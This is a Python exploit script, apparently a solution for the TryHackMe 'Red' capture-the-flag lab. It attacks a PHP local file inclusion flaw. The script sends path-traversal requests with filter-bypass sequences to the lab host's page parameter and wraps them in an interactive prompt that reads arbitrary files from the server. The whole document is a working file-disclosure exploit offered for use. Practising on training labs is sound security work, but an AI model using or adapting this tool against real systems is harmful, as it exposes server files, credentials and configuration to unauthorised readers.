#!/usr/bin/env python3

"""
Vulnerability: CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program
Author: Pedro Parmentier (HellHound)
Challenge: Red
Platform: TryHackMe
"""

import requests as req
from sys import exit
from urllib3 import disable_warnings
from termcolor import colored


from prompt_toolkit import PromptSession, HTML
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory


# No warnings for insecure request
disable_warnings()


def make_req(file):

    try:
        res = req.get(
                f'http://red.thm/index.php?page=assets.././../.....///.././../.....///.././../.....///.././../.....///.././../.....///{file}',
                verify=True,
                timeout=3
        )

        if res.status_code == 200:
            return res.text.strip()
    except (req.exceptions.ConnectionError, req.exceptions.ReadTimeout) as e:
        print(colored(f" [x] Error: {e}", 'red'))
        exit(1)


def main():

    try:
        session = PromptSession(history=InMemoryHistory())

        while True:

            shell = session.prompt(
                    HTML("<green> > </green>"),
                    auto_suggest=AutoSuggestFromHistory()
            ).strip()

            if shell.startswith("/"):
                shell = shell.lstrip("/")

            shell = "/".join(s for s in shell.split(" "))

            lfi = make_req(shell)
            print(lfi)



    except KeyboardInterrupt:
        print(colored("\n Saliendo...", 'light_cyan'))
        exit()



if __name__ == '__main__':

    main()
